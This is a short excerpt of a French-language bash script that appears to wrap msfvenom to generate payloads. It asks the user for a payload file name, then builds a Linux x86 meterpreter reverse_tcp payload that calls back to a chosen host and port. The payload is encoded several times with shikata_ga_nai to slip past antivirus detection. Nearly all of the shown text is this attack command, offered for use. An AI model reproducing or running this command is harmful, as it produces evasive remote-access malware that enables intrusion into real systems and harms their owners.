...
echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le nom à donner au payload (NOM.sh) : $DEFAULT"
read nom
...
cd
msfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ipprivee LPORT=$port -i $iterations -f bash R > $path/../../output/$nom | grep "x86/shikata_ga_nai"
